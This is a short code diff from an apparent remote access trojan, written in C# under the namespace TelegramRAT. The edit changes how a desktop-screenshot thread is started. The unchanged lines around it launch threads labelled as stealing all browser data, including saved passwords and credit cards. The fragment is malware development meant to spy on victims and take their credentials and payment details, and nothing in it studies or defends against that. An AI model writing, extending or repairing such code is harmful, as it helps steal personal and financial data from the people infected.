@@ -34,7 +34,7 @@ namespace TelegramRAT
             // Threads list
             List<Thread> threads = new List<Thread> {
                 // Screenshot
-                new Thread(utils.desktopScreenshot),
+                new Thread(() => utils.desktopScreenshot(0)),
                 // Steal all data from browsers
                 new Thread(Passwords.get),
                 new Thread(CreditCards.get),
